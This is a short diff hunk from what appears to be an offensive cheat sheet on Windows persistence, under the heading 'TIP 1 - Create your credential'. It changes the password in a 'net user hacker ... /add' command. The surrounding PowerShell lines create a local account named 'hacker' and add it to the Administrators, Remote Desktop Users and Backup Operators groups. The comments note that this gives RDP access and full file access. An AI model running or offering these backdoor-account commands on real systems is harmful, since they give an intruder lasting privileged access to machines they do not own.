@@ -25,7 +25,7 @@
 ### TIP 1 - Create your credential
 
 ```powershell
-net user hacker hacker1234* /add
+net user hacker Hcker_12345678* /add /Y
 net localgroup administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /add # RDP access
 net localgroup "Backup Operators" hacker /add # Full access to files
